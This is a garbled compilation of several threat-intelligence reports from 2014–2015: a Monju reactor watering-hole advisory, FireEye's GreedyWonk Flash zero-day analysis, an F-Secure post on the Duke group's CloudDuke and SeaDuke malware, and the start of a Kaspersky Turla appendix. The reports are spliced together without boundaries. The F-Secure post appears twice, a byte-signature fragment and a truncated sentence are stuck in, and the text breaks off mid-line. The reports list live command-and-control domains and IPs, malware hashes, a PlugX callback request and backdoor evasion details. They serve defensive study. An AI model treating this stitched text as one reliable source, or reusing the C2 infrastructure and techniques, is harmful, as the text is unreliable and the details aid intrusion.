difficult.The analysed code suggests that even file system and registry operations can be delegated by an infected module to another
module in order to stay unnoticed by behaviour analysis engines of the antivirus products, and to overcome account restrictions of
the browser processes so that the injected module could still write into files and into the sensitive registry hives.The logs and dumps it creates on the hidden virtual volumes contributes to its stealthiness too.A great deal of attention has also
been given to keep its network communications as quiet as possible.Its ability to generate malicious traffic whenever the user
goes online and start loading the web pages allows it to ‘blend in’ with the legitimate communications.We expect much more will be uncovered by researchers in the coming weeks as the capabilities of this operation are further fleshed
out.However, as we implied in the opening section, we view this threat to be a permanent feature of the landscape.Whether they
dismantle this toolset and start from scratch, or continue using tools which have been exposed, remains to be seen.For their
targets though the considerable challenge of keeping secrets safe on sensitive networks will certainly continue for years to come.All rights reserved.BAE SYSTEMS, the BAE SYSTEMS Logo and the product names referenced herein are trademarks of BAE
Systems plc.BAE Systems Applied Intelligence Limited registered in England & Wales (No.1337451) with its registered office at
Surrey Research Park, Guildford, England, GU2 7RQ.No part of this document may be copied, reproduced, adapted or redistributed
in any form or by any means without the express prior written consent of BAE Systems Applied Intelligence.                                                                 TLP: WHITE




Context Threat Intelligence
Threat Advisory
The Monju Incident



Context Ref.The various levels of the TLP are represented by the following colours:

RED - Personal; for named recipients only

Sources may use TLP: RED when information cannot be effectively acted upon by
additional parties, and could lead to impacts on a party's privacy, reputation, or
operations if misused.Recipients may not share TLP: RED information with any parties outside of the specific
exchange, meeting, or conversation in which it is originally disclosed.TLP: RED
information will be passed verbally or in person.AMBER - Limited Distribution

Sources may use TLP: AMBER when information requires support to be effectively acted
upon, but carries risks to privacy, reputation, or operations if shared outside of the
organisations involved.Recipients may only share TLP: AMBER information with members of their own
organisation who need to know, and only as widely as necessary to act on that
information.GREEN – Community Wide

Sources may use TLP: GREEN when information is useful for the awareness of all
participating organisations as well as with peers within the broader community or sector.Recipients may share TLP: GREEN information with peers and partner organisations within
their sector or community, but not via publicly accessible channels such as publication
or posting publicly on the Internet.- Unlimited Distribution

Sources may use TLP: WHITE when information carries minimal or no foreseeable risk of
misuse, in accordance with applicable rules and procedures for public release.Subject to standard copyright rules, TLP: WHITE information may be distributed freely,
without restriction.1   http://www.oecd.org/dataoecd/25/10/40761118.pdf

                                TLP: WHITE                                        Page 3 / 11
                             TLP: WHITE




2 Executive Summary

On 2nd January 2014 a Systems Administrator at the Monju fast breeder reactor facility in
Japan noticed suspicious connections emanating from a machine in the control room,
coinciding with what was a seemingly routine software update to a free media player.Among other items, staff training documents and more than 40,000 emails were stored
on the machine and thought to be harvested by the attacker.The Japanese Atomic
Energy Agency is investigating further.The attack appears to have been the result of the attackers having compromised the
‘GOM Player’ update server and having it act as a ‘watering hole’, meaning that
machines which access the site are delivered malware.Gom Player originates in South
Korea and in some parts of Asia it is a popular alternative to Windows Media Player.It is
unclear whether every machine trying to download an update received this malware or
whether only machines which fitted a certain profile were infected.Technical analysis of the implant on the compromised machine has shown it to be a
variant of a Trojan which has been in the wild for some years now and continues to be
effective.The ‘Gh0st RAT’ has been used extensively in attacks linked to the Chinese
state, though it is important to remember that the code is publicly available and can be
modified and used by anyone.The targeting of a Japanese nuclear facility however, is
consistent with Chinese state intelligence requirements.If this is the work of a Chinese
group then we feel the targeting may go much further than the Civil Nuclear sector and
thus be of interest to the wider Energy Sector and industry as a whole.In order to inform the Energy Sector and beyond about this attack, we have compiled a
technical summary of the attack and have provided a number of Indicators Of
Compromise (IOCs) which can be used to aid detection.It is likely that the attackers
would redeploy their implant against other targets, albeit with a delivery mechanism
more tailored to the location of the intended victims.TLP: WHITE                                           Page 4 / 11
                                         TLP: WHITE




3 The Monju Incident

3.1 Infection Vector
Based on open source reporting, it appears that the intrusion took place via the
compromise of the GOM Player update server (app.gomlab.com), where attackers
may have gained entry via a PHP-based webshell, hidden within an image, present on
the host since October 2011[2].The observed malicious activity relates to the modification of a file that controls GOM
Player updates, spanning the date range 27th December 2013 to 16th January 2014,
during which time these alterations are reported to have only manifested themselves for
visitors on certain IP ranges; evidence supporting this claim has not yet been made
public.If this was indeed the case, then the nature of this attack is certainly more
targeted than one that would cover the entire userbase of the GOM Player product,
with victims comprising of the Japanese Government in addition to those at the Monju
nuclear facility.The modified file redirected the GOM Player update process to another compromised
server (www.fudousankaitori.jp (203.189.101.35)), where a file containing both the
legitimate update and the malware was deliver to the victim.Upon extraction from the RAR
archive, the installer component (0ae82fd94836815a1e8d284ccb75109d) is
automatically launched alongside the GOM Player update, distracting victims from the
malicious activity taking place.The installer component is referred to by the author as ‘miansha' which, according to an
East Asia Cyber Threat Intelligence Researcher, is likely Miǎnshā (免杀), a phrase
commonly used by People’s Republic of China (PRC) hackers to mean ‘anti Antivirus
detection’ or ‘Antivirus avoidance’; Symantec[3] have named the detection for this
code ‘Backdoor.Miancha’, where Miǎnchá (免查, likely shorthand for 免杀查) similarly
means ‘Antivirus avoidance’.Oddly, this file is padded with null
bytes, resulting in a 25 megabyte file.The loader, referred to by the malware author as 壳 (shell),
reads and deobfuscates the main implant code which then communicates with the
attacker-controlled server at testqweasd.tk (211.43.220.89) on TCP port 443.The main
implant code is referred to as 白加黑 (‘Black on White’), a term used in the PRC hacking
community to denote the act of Antivirus avoidance through the loading of malicious
‘black’ code via non-malicious or trusted ‘white‘ code.This is a practice recently
illustrated through the deployment of the PlugX trojan, utilising DLL load order hijacking
alongside a signed (trusted) executable.Analysis of this malware revealed it to be a variant of the Gh0st RAT, often used by
Chinese actors (including those who are state-motivated or directly state-sponsored).This specific variant shows similarities to that used during the VOHO campaign[4], where
Gh0st RAT was spread via watering hole attacks utilising vulnerable websites belonging
to financial services and technology companies.Specifically, the initial five bytes of the
communications (often used to denote a campaign or victim) are ‘HTTPS’, amended
from the original ‘Gh0st’; the same as the traffic produced by the VOHO Gh0st variant.In addition to delivering system-specific details back to the attacker, Gh0st RAT provides
the capability to deploy additional malware, enabling the harvesting of sensitive data
and enabling the further propagation throughout the infected network.??80 c2 7a 80 f2 19 88 ????41 3b ce 7c ??}28            155 Queen Street
London E14 9TP         Cheltenham GL53 7LS        40215 Düsseldorf        Melbourne VIC 3000
United Kingdom         United Kingdom             Germany                 Australia



                               TLP: WHITE                                             Page 11 / 11Operation GreedyWonk: Multiple Economic and Foreign Policy Sites
Compromised, Serving Up Flash Zero-Day Exploit
Less than a week after uncovering Operation SnowMan, the FireEye Dynamic Threat Intelligence cloud
has identified another targeted attack campaign — this one exploiting a zero-day vulnerability in Flash.We are collaborating with Adobe security on this issue.Adobe has assigned the CVE identifier CVE-2014-
0502 to this vulnerability and released a security bulletin.As of this blog post, visitors to at least three nonprofit institutions — two of which focus on matters of
national security and public policy — were redirected to an exploit server hosting the zero-day exploit.We’re dubbing this attack “Operation GreedyWonk.”

We believe GreedyWonk may be related to a May 2012 campaign outlined by ShadowServer, based
on consistencies in tradecraft (particularly with the websites chosen for this strategic Web compromise),
attack infrastructure, and malware configuration properties.The group behind this campaign appears to have sufficient resources (such as access to zero-day exploits)
and a determination to infect visitors to foreign and public policy websites.The threat actors likely sought
to infect users to these sites for follow-on data theft, including information related to defense and public
policy matters.Discovery

On Feb. 13, FireEye identified a zero-day Adobe Flash exploit that affects the latest version of the Flash
Player (12.0.0.4 and 11.7.700.261).Visitors to the Peter G. Peterson Institute for International Economics
(www.piie[.]com) were redirected to an exploit server hosting this Flash zero-day through a hidden
iframe.We subsequently found that the American Research Center in Egypt (www.arce[.]org) and the Smith
Richardson Foundation (www.srf[.]org) also redirected visitors the exploit server.All three organizations
are nonprofit institutions; the Peterson Institute and Smith Richardson Foundation engage in national
security and public policy issues.Mitigation

To bypass Windows’ Address Space Layout Randomization (ASLR) protections, this exploit targets
computers with any of the following configurations:

      Windows XP
      Windows 7 and Java 1.6
      Windows 7 and an out-of-date version of Microsoft Office 2007 or 2010

Users can mitigate the threat by upgrading from Windows XP and updating Java and Office.If you
have Java 1.6, update Java to the latest 1.7 version.If you are using an out-of-date Microsoft Office 2007
or 2010, update Microsoft Office to the latest version.These mitigations do not patch the underlying vulnerability.But by breaking the exploit’s ASLR-bypass
measures, they do prevent the current in-the-wild exploit from functioning.Vulnerability analysis

GreedyWonk targets a previously unknown vulnerability in Adobe Flash.The vulnerability permits an
attacker to overwrite the vftable pointer of a Flash object to redirect code execution.ASLR bypass

The attack uses only known ASLR bypasses.Details of these techniques are available from our previous
blog post on the subject (in the “Non-ASLR modules” section).For Windows XP, the attackers build a return-oriented programming (ROP) chain of MSVCRT (Visual C
runtime) gadgets with hard-coded base addresses for English (“en”) and Chinese (“zh-cn” and “zh-tw”).On Windows 7, the attackers use a hard-coded ROP chain for MSVCR71.dll (Visual C++ runtime) if the
user has Java 1.6, and a hard-coded ROP chain for HXDS.dll (Help Data Services Module) if the user has
Microsoft Office 2007 or 2010.Java 1.6 is no longer supported and does not receive security updates.In addition to the MSVCR71.dll
ASLR bypass, a variety of widely exploited code-execution vulnerabilities exist in Java 1.6.That’s why
FireEye strongly recommends upgrading to Java 1.7.The Microsoft Office HXDS.dll ASLR bypass was patched at the end of 2013.More details about this
bypass are addressed by Microsoft’s Security Bulletin MS13-106 and an accompanying blog entry.FireEye strongly recommends updating Microsoft Office 2007 and 2010 with the latest patches.Shellcode analysis

The shellcode is downloaded in ActionScript as a GIF image.Once ROP marks the shellcode as executable
using Windows’ VirtualProtect function, it downloads an executable via the InternetOpenURLA and
InternetReadFile functions.Then it writes the file to disk with CreateFileA and WriteFile functions.Finally, it runs the file using the WinExec function.PlugX/Kaba payload analysis

Once the exploit succeeds, a PlugX/Kaba remote access tool (RAT) payload with the MD5 hash
507aed81e3106da8c50efb3a045c5e2b is installed on the compromised endpoint.This PlugX sample was
compiled on Feb. 12, one day before we first observed it, indicating that it was deployed specifically for
this campaign.This PlugX payload was configured with the following command-and-control (CnC) domains:

      java.ns1[.]name
      adservice.no-ip[.]org
      wmi.ns01[.]us

Sample callback traffic was as follows:

    POST /D28419029043311C6F8BF9F5 HTTP/1.1
    Accept: */*
    HHV1: 0
    HHV2: 0
    HHV3: 61456
    HHV4: 1
    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;
    InfoPath.2; .NET CLR 2.0.50727; SV1)
    Host: java.ns1.name
    Content-Length: 0
    Connection: Keep-Alive
    Cache-Control: no-cache

Campaign analysis

Both java.ns1[.]name and adservice.no-ip[.]org resolved to 74.126.177.68 on Feb. 18, 2014.Passive DNS
analysis reveals that the domain wmi.ns01.us previously resolved to 103.246.246.103 between July 4,
2013 and July 15, 2013 and 192.74.246.219 on Feb. 17, 2014.java.ns1[.]name also resolved to
192.74.246.219 on February 18.Domain                  First Seen    Last Seen        IP Address
adservice.no-ip[.]org   2014-02-18    2014-02-19       74.126.177.68
java.ns1[.]name         2014-02-18    2014-02-19       74.126.177.68
java.ns1[.]name         2014-02-18    2014-02-18       192.74.246.219
wmi.ns01[.]us           2014-02-17    2014-02-17       192.74.246.219
proxy.ddns[.]info       2013-05-02    2014-02-18       103.246.246.103
updatedns.ns02[.]us 2013-09-06       2013-09-06      103.246.246.103
updatedns.ns01[.]us 2013-09-06       2013-09-06      103.246.246.103
wmi.ns01[.]us       2013-07-04       2013-07-15      103.246.246.103

Further research uncovered a number of older malware samples connecting to the same domain
wmi.ns01[.]us.MD5                               Family Compile Alternate C2s
                                           Time
7995a9a6a889b914e208eb924e459ebc PlugX     2012-06-09 fuckchina.govnb[.]com
bf60b8d26bc0c94dda2e3471de6ec977 PlugX     2010-03-15 microsafes.no-ip[.]org
fd69793bd63c44bbb22f9c4d46873252 Poison 2013-03-07 N/A
                                  Ivy
88b375e3b5c50a3e6c881bc96c926928 Poison 2012-06-11 N/A
                                  Ivy
cd07a9e49b1f909e1bd9e39a7a6e56b4 Poison 2012-06-11 N/A
                                  Ivy
Domain                 First Seen   Last Seen       IP Address
fuckchina.govnb[.]com 2013-12-11    2013-12-11      204.200.222.136
microsafes.no-ip[.]org 2014-02-12   2014-02-12      74.126.177.70
microsafes.no-ip[.]org 2013-12-04   2013-12-04      74.126.177.241

The Poison Ivy variants that connected to the domain wmi.ns01[.In this previous incident,
visitors to the Center for Defense Information website (www.cdi[.]org — also an organization involved in
defense matters — were redirected to an exploit server at 159.54.62.92.This exploit server hosted a Flash exploit file named BrightBalls.swf (MD5
1ec5141051776ec9092db92050192758).This exploit, in turn, dropped the Poison Ivy variant.In addition
to using the same password “java7,” this variant was configured with the mutex with the similar pattern of
“YFds*&^ff” and connected to a CnC server at windows.ddns[.]us.Using passive DNS analysis, we see the domains windows.ddns[.]us and wmi.ns01[.]us both resolved to
76.73.80.188 in mid-2012.Domain              First Seen       Last Seen       IP Address
wmi.ns01.us         2012-07-07       2012-09-19      76.73.80.188
windows.ddns.us     2012-05-23       2012-06-10      76.73.80.188
During another earlier compromise of the same www.cdi.org website, visitors were redirected to a Java
exploit test.jar (MD5 7d810e3564c4eb95bcb3d11ce191208e).This jar file exploited CVE-2012-0507 and
dropped a Poison Ivy payload with the hash (MD5 52aa791a524b61b129344f10b4712f52).This Poison Ivy
variant connected to a CnC server at ids.ns01[.]us.The domain ids.ns01[.]us also overlaps with the
domain wmi.ns01[.]us on the IP 194.183.224.75.Domain              First Seen       Last Seen         IP Address
wmi.ns01[.]us       2012-07-03       2012-07-04        194.183.224.75
ids.ns01[.]us       2012-04-23       2012-05-18        194.183.224.75

The Poison Ivy sample referenced above (MD5 fd69793bd63c44bbb22f9c4d46873252) was delivered via
an exploit chain that began with a redirect from the Center for European Policy Studies (www.ceps[.]be).In this case, visitors were redirected from www.ceps[.]be to a Java exploit hosted on shop.fujifilm[.]be.In what is certainly not a coincidence, we also observed www.arce[.]org (one of the sites redirecting to the
current Flash exploit) also redirect visitors to the Java exploit on shop.fujifilm[.]be in 2013.Conclusion

This threat actor clearly seeks out and compromises websites of organizations related to international
security policy, defense topics, and other non-profit sociocultural issues.The actor either maintains
persistence on these sites for extended periods of time or is able to re-compromise them periodically.This actor also has early access to a number of zero-day exploits, including Flash and Java, and deploys a
variety of malware families on compromised systems.Based on these and other observations, we conclude
that this actor has the tradecraft abilities and resources to remain a credible threat in at least the mid-
term.Duke APT group's latest tools: cloud services and Linux support - F-
Secure Weblog : News from the Lab

Recent weeks have seen the outing of two new additions to the Duke group's toolset, SeaDuke and
CloudDuke.Of these, SeaDuke is a simple trojan made interesting by the fact that it's written in Python.And even more curiously, SeaDuke, with its built-in support for both Windows and Linux, is the first
cross-platform malware we have observed from the Duke group.While SeaDuke is a single - albeit cross-
platform - trojan, CloudDuke appears to be an entire toolset of malware components, or "solutions" as the
Duke group apparently calls them.These components include a unique loader, downloader, and not one
but two different trojan components.CloudDuke also greatly expands on the Duke group's usage of cloud
storage services, specifically Microsoft's OneDrive, as a channel for both command and control as well as
the exfiltration of stolen data.Finally, some of the recent CloudDuke spear-phishing campaigns have born
a striking resemblance to CozyDuke spear-phishing campaigns from a year ago.Linux support added with the cross-platform SeaDuke malware

Last week, both Symantec and Palo Alto Networks published research on SeaDuke, a newer addition to the
arsenal of trojans being used by the Duke group.While older malware by the Duke group has always been
written with a combination of the C and C++ programming languages as well as assembly language,
SeaDuke is peculiarly written in Python with multiple layers of obfuscation.This Python code is usually
then compiled into Windows executables using py2exe or pyinstaller.However, the Python code itself has
been designed to work on both Windows and Linux.We therefore suspect, that the Duke group is also
using the same SeaDuke Python code to target Linux victims.This is the first time we have seen the Duke
group employ malware to target Linux platforms.An example of the cross-platform support found in SeaDuke.A new set of solutions with the CloudDuke malware toolset

Last week, we also saw Palo Alto Networks and Kaspersky Labs publish research on malware components
they respectively called MiniDionis and CloudLook.MiniDionis and CloudLook are both components of a

larger malware toolset we call CloudDuke.This toolset consists of malware components that provide
varying functionality while partially relying on a shared code framework and always using the same
loader.Based on PDB strings found in the samples, the malware authors refer to the CloudDuke
components as "solutions" with names such as "DropperSolution", "BastionSolution" and
"OneDriveSolution".A list of PDB strings we have observed is below:

• C:\DropperSolution\Droppers\Projects\Drop_v2\Release\Drop_v2.pdb
• c:\BastionSolution\Shells\Projects\miniDionis4\miniDionis\obj\Release\miniDionis.pdb
• c:\BastionSolution\Shells\Projects\miniDionis2\miniDionis\obj\Release\miniDionis.pdb
• c:\OneDriveSolution\Shells\Projects\OneDrive2\OneDrive\obj\x64\Release\OneDrive.pdb

The first of the CloudDuke components we have observed is a downloader internally called
"DropperSolution".The purpose of the downloader is to download and execute additional malware on the
victim's system.In most observed cases, the downloader will attempt to connect to a compromised
website to download an encrypted malicious payload which the downloader will decrypt and execute.Depending on the way the downloader has been configured, in some cases it may first attempt to log in to
Microsoft's cloud storage service OneDrive and retrieve the payload from there.If no payload is available
from OneDrive, the downloader will revert to the previously mentioned method of downloading from
compromised websites.We have also observed two distinct trojan components in the CloudDuke toolset.The first of these,
internally called "BastionSolution", is the trojan that Palo Alto Networks described in their research into
"MiniDionis".Interestingly, BastionSolution appears to functionally be an exact copy of SeaDuke with the
only real difference being the choice of programming language.BastionSolution also makes significant use
of a code framework that is apparently internally called "Z".This framework provides classes for
functionality such as encryption, compression, randomization and network communications.A list of classes in the BastionSolution trojan, including multiple classes from the "Z" framework.Classes from the same "Z" framework, such as the encryption and randomization classes, are also used by
the second trojan component of the CloudDuke toolset.This second component, internally called
"OneDriveSolution", is especially interesting because it relies on Microsoft's cloud storage service
OneDrive as its command and control channel.To achieve this, OneDriveSolution will attempt to log into
OneDrive with a preconfigured username and password.If successful, OneDriveSolution will then proceed
to copy data from the victim's computer to the OneDrive account.It will also search the OneDrive account
for files containing commands for the malware to execute.A list of classes in the OneDriveSolution trojan, including multiple classes from the "Z" framework.All of the CloudDuke "solutions" use the same loader, a piece of code whose primary purpose is to decrypt
the embedded, encrypted solution, load it in memory and execute it.The Duke group has often employed

loaders for their malware but unlike the previous loaders they have used, the CloudDuke loader is much
more versatile with support for multiple methods of loading and executing the final payload as well as the
ability to write to disk and execute additional malware components.CloudDuke spear-phishing campaigns and similarities with CozyDuke

CloudDuke has recently been spread via spear-phishing emails with targets reportedly including
organizations such as the US Department of Defense.These spear-phising emails have contained links to
compromised websites hosting zip archives that contain CloudDuke-laden executables.In most cases,
executing these executables will have resulted in two additional files being written to the victim's hard
disk.The first of these files has been a decoy, such as an audio file or a PDF file while the second one has
been a CloudDuke loader embedding a CloudDuke downloader, the so-called "DropperSolution".In these
cases, the victim has been presented with the decoy file while in the background the downloader has
proceeded to download and execute one of the CloudDuke trojans, "OneDriveSolution" or
"BastionSolution".Example of one of the decoy documents employed in the CloudDuke spear-phishing campaigns.It has
apparently been copied by the attackers from here.Interestingly, however, some of the other CloudDuke spear-phishing campaigns we have observed this
July have born a striking resemblance to CozyDuke spear-phishing campaigns seen almost exactly a year
ago, in the beginning of July 2014.In both spear-phishing campaigns, the decoy document has been the
exact same PDF file, a "US letter fax test page" (28d29c702fdf3c16f27b33f3e32687dd82185e8b).Similarly, the URLs hosting the malicious files have, in both campaigns, purported to be related to eFaxes.It is also interesting to note, that in the case of the CozyDuke-inspired CloudDuke spear-phishing
campaign, the downloading and execution of the malicious archive linked to in the emails has not resulted
in the execution of the CloudDuke downloader but in the execution of the "BastionSolution" component
thereby skipping one step from the process described for the other CloudDuke spear-phishing campaigns.The "US letter fax test page" decoy employed in both CloudDuke and CozyDuke spear-phishing
campaigns.Increasingly using cloud services to evade detection

CloudDuke is not the first time we have observed the Duke group use cloud services in general and
Microsoft OneDrive specifically as part of their operations.Earlier this spring we released research on
CozyDuke where we mentioned observing CozyDuke sometimes either directly use a OneDrive account to
exfiltrate stolen data or alternatively CozyDuke downloading Visual Basic scripts that would copy stolen
files to a OneDrive account and sometimes even retrieve files containing additional commands from the
same OneDrive account.In these previous cases the Duke group has only used OneDrive as a secondary communication channel
but still relied on more traditional C&C channels for most of their actions.It is therefore interesting to
note that CloudDuke actually enables the Duke group to rely solely on OneDrive for every step of their
operation from downloading the actual trojan, passing commands to the trojan and finally exfiltrating
stolen data.By relying solely on 3rd party web services, such as OneDrive, as their command and control channel, we
believe the Duke group is trying to better evade detection.Large amounts of data being transferred from
an organization's network to an unknown web server easily raises suspicions.However, data being
transferred to a popular cloud storage service is normal.What better way for an attacker to surreptitiously
transfer large amounts of stolen data than the same way people are transferring that same data every day
for legitimate reasons.(Coincidentally, the implications of 3rd party web services being used as command
and control channels is also the subject of an upcoming talk at the VirusBulletin 2015 conference).Directing limited resources towards evading detection and staying ahead of defenders

Developing even a single multipurpose malware toolset, never mind many, requires time and resources.Therefore it seems logical to attempt to reuse code such as supporting frameworks between different
toolsets.The Duke group, however, appear to have taken this a step further with SeaDuke and the
CloudDuke component BastionSolution, by rewriting the same code in multiple programming languages.This has the obvious benefits of saving time and resources by providing two malware toolsets, that while
similar on the inside, appear completely different on the outside.This way, the discovery of one toolset
does not immediately lead to the discovery of the second toolset.The Duke group, long suspected of ties to the Russian state, have been running their espionage operation
for an unusually long time and - especially lately - with unusual brazenness.These latest CloudDuke and
SeaDuke campaigns appear to be a clear sign that the Duke's are not planning to stop any time soon.Of these, SeaDuke is a simple trojan made interesting by the fact that it's written in Python.And even more curiously, SeaDuke, with its built-in support for both Windows and Linux, is the first
cross-platform malware we have observed from the Duke group.While SeaDuke is a single - albeit cross-
platform - trojan, CloudDuke appears to be an entire toolset of malware components, or "solutions" as the
Duke group apparently calls them.These components include a unique loader, downloader, and not one
but two different trojan components.CloudDuke also greatly expands on the Duke group's usage of cloud
storage services, specifically Microsoft's OneDrive, as a channel for both command and control as well as
the exfiltration of stolen data.Finally, some of the recent CloudDuke spear-phishing campaigns have born
a striking resemblance to CozyDuke spear-phishing campaigns from a year ago.Linux support added with the cross-platform SeaDuke malware

Last week, both Symantec and Palo Alto Networks published research on SeaDuke, a newer addition to the
arsenal of trojans being used by the Duke group.While older malware by the Duke group has always been
written with a combination of the C and C++ programming languages as well as assembly language,
SeaDuke is peculiarly written in Python with multiple layers of obfuscation.This Python code is usually
then compiled into Windows executables using py2exe or pyinstaller.However, the Python code itself has
been designed to work on both Windows and Linux.We therefore suspect, that the Duke group is also
using the same SeaDuke Python code to target Linux victims.This is the first time we have seen the Duke
group employ malware to target Linux platforms.An example of the cross-platform support found in SeaDuke.A new set of solutions with the CloudDuke malware toolset

Last week, we also saw Palo Alto Networks and Kaspersky Labs publish research on malware components
they respectively called MiniDionis and CloudLook.MiniDionis and CloudLook are both components of a
larger malware toolset we call CloudDuke.This toolset consists of malware components that provide
varying functionality while partially relying on a shared code framework and always using the same
loader.Based on PDB strings found in the samples, the malware authors refer to the CloudDuke
components as "solutions" with names such as "DropperSolution", "BastionSolution" and
"OneDriveSolution".A list of PDB strings we have observed is below:

• C:\DropperSolution\Droppers\Projects\Drop_v2\Release\Drop_v2.pdb
• c:\BastionSolution\Shells\Projects\miniDionis4\miniDionis\obj\Release\miniDionis.pdb
• c:\BastionSolution\Shells\Projects\miniDionis2\miniDionis\obj\Release\miniDionis.pdb
• c:\OneDriveSolution\Shells\Projects\OneDrive2\OneDrive\obj\x64\Release\OneDrive.pdb

The first of the CloudDuke components we have observed is a downloader internally called
"DropperSolution".The purpose of the downloader is to download and execute additional malware on the
victim's system.In most observed cases, the downloader will attempt to connect to a compromised
website to download an encrypted malicious payload which the downloader will decrypt and execute.Depending on the way the downloader has been configured, in some cases it may first attempt to log in to
Microsoft's cloud storage service OneDrive and retrieve the payload from there.If no payload is available
from OneDrive, the downloader will revert to the previously mentioned method of downloading from
compromised websites.We have also observed two distinct trojan components in the CloudDuke toolset.The first of these,
internally called "BastionSolution", is the trojan that Palo Alto Networks described in their research into
"MiniDionis".Interestingly, BastionSolution appears to functionally be an exact copy of SeaDuke with the
only real difference being the choice of programming language.BastionSolution also makes significant use
of a code framework that is apparently internally called "Z".This framework provides classes for
functionality such as encryption, compression, randomization and network communications.A list of classes in the BastionSolution trojan, including multiple classes from the "Z" framework.Classes from the same "Z" framework, such as the encryption and randomization classes, are also used by
the second trojan component of the CloudDuke toolset.This second component, internally called
"OneDriveSolution", is especially interesting because it relies on Microsoft's cloud storage service
OneDrive as its command and control channel.To achieve this, OneDriveSolution will attempt to log into
OneDrive with a preconfigured username and password.If successful, OneDriveSolution will then proceed
to copy data from the victim's computer to the OneDrive account.It will also search the OneDrive account
for files containing commands for the malware to execute.A list of classes in the OneDriveSolution trojan, including multiple classes from the "Z" framework.All of the CloudDuke "solutions" use the same loader, a piece of code whose primary purpose is to decrypt
the embedded, encrypted solution, load it in memory and execute it.The Duke group has often employed

loaders for their malware but unlike the previous loaders they have used, the CloudDuke loader is much
more versatile with support for multiple methods of loading and executing the final payload as well as the
ability to write to disk and execute additional malware components.CloudDuke spear-phishing campaigns and similarities with CozyDuke

CloudDuke has recently been spread via spear-phishing emails with targets reportedly including
organizations such as the US Department of Defense.These spear-phising emails have contained links to
compromised websites hosting zip archives that contain CloudDuke-laden executables.In most cases,
executing these executables will have resulted in two additional files being written to the victim's hard
disk.The first of these files has been a decoy, such as an audio file or a PDF file while the second one has
been a CloudDuke loader embedding a CloudDuke downloader, the so-called "DropperSolution".In these
cases, the victim has been presented with the decoy file while in the background the downloader has
proceeded to download and execute one of the CloudDuke trojans, "OneDriveSolution" or
"BastionSolution".Example of one of the decoy documents employed in the CloudDuke spear-phishing campaigns.It has
apparently been copied by the attackers from here.Interestingly, however, some of the other CloudDuke spear-phishing campaigns we have observed this
July have born a striking resemblance to CozyDuke spear-phishing campaigns seen almost exactly a year
ago, in the beginning of July 2014.In both spear-phishing campaigns, the decoy document has been the
exact same PDF file, a "US letter fax test page" (28d29c702fdf3c16f27b33f3e32687dd82185e8b).Similarly, the URLs hosting the malicious files have, in both campaigns, purported to be related to eFaxes.It is also interesting to note, that in the case of the CozyDuke-inspired CloudDuke spear-phishing
campaign, the downloading and execution of the malicious archive linked to in the emails has not resulted
in the execution of the CloudDuke downloader but in the execution of the "BastionSolution" component
thereby skipping one step from the process described for the other CloudDuke spear-phishing campaigns.The "US letter fax test page" decoy employed in both CloudDuke and CozyDuke spear-phishing
campaigns.Increasingly using cloud services to evade detection

CloudDuke is not the first time we have observed the Duke group use cloud services in general and
Microsoft OneDrive specifically as part of their operations.Earlier this spring we released research on
CozyDuke where we mentioned observing CozyDuke sometimes either directly use a OneDrive account to
exfiltrate stolen data or alternatively CozyDuke downloading Visual Basic scripts that would copy stolen
files to a OneDrive account and sometimes even retrieve files containing additional commands from the
same OneDrive account.In these previous cases the Duke group has only used OneDrive as a secondary communication channel
but still relied on more traditional C&C channels for most of their actions.It is therefore interesting to
note that CloudDuke actually enables the Duke group to rely solely on OneDrive for every step of their
operation from downloading the actual trojan, passing commands to the trojan and finally exfiltrating
stolen data.By relying solely on 3rd party web services, such as OneDrive, as their command and control channel, we
believe the Duke group is trying to better evade detection.Large amounts of data being transferred from
an organization's network to an unknown web server easily raises suspicions.However, data being
transferred to a popular cloud storage service is normal.What better way for an attacker to surreptitiously
transfer large amounts of stolen data than the same way people are transferring that same data every day
for legitimate reasons.(Coincidentally, the implications of 3rd party web services being used as command
and control channels is also the subject of an upcoming talk at the VirusBulletin 2015 conference).Directing limited resources towards evading detection and staying ahead of defenders

Developing even a single multipurpose malware toolset, never mind many, requires time and resources.Therefore it seems logical to attempt to reuse code such as supporting frameworks between different
toolsets.The Duke group, however, appear to have taken this a step further with SeaDuke and the
CloudDuke component BastionSolution, by rewriting the same code in multiple programming languages.This has the obvious benefits of saving time and resources by providing two malware toolsets, that while
similar on the inside, appear completely different on the outside.This way, the discovery of one toolset
does not immediately lead to the discovery of the second toolset.The Duke group, long suspected of ties to the Russian state, have been running their espionage operation
for an unusually long time and - especially lately - with unusual brazenness.These latest CloudDuke and
SeaDuke campaigns appear to be a clear sign that the Duke's are not planning to stop any time soon.The Epic Turla Operation: 
Solving some of the mysteries of 
Snake/Uroboros
Kaspersky Lab Global Research and Analysis Team

Version 1.0
August 6, 2014

2

Technical appendix: malware samples 
and indicators of compromise (IOC)

A. Keylogger module

File name: varies
MD5: a3cbf6179d437909eb532b7319b3dafe
Compilation timestamp: 2012.10.02 10:51:50 (GMT)
Compiler: Microsoft Visual Studio 2010
File format: PE32 DLL
Exports: _LowLevelKeyboardProc@12

Creates the log file: %TEMP%\~DFD3O8.tmp.Depending on the results, it writes a line to its log file.In case the hook was installed, the line is 
“Started...”, else “LoadLibrary ‘%path to its file%’ failed, %error code%”.It also starts a thread that retrieves the current foreground window handle every 100 milliseconds.This handle is then used in the keyboard hook procedure.The low-level keyboard hook procedure intercepts WM_KEYDOWN, WM_KEYUP and WM_
SYSKEYDOWN system messages and writes information about each keystroke to the log file.Every 
time a new window becomes active, it retrieves its name and the path to its application and writes 
this information to the log file:

[%path to the application’s executable file%: “%window title%”]

TLP: GreenFor any inquire please contact intelreports@kaspersky.com3

B.The “Epic/Tavdig/Wipbot” backdoor (Main backdoor module)

Analyzed file (others are similar):

Compilation timestamp: 2013.10.15 10:43:09 (GMT)
File format: PE32 DLL, modified (the file is supposed to be started by a custom loader)
Exports:  

  1000837F: ModuleStart
  100083A9: ModuleStop
  100083BB: start
 
The main functionality is implemented in a single function that is called by the DllMain entry point.The exported functions allow to call the same function directly (exported as “start”) or to start/stop 
it in a separate thread (“ModuleStart”/”ModuleStop”) and with slightly different parameters.This 
indicates the backdoor can also function as a plugin for the Turla Carbon system.The main function executes in an infinite loop.It collects most of the available information about the 
system, transmits it to the C&C server and executes the commands it receives back.The module delays 
execution for random periods while it discovers running processes with one of the following filenames:

•  tcpdump.exe
•  windump.exe
•  ethereal.exe
•  wireshark.exe
•  ettercap.exe
•  snoop.exe
•  dsniff.exe

The following system information is collected:

1.Hardware information.•  Registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\

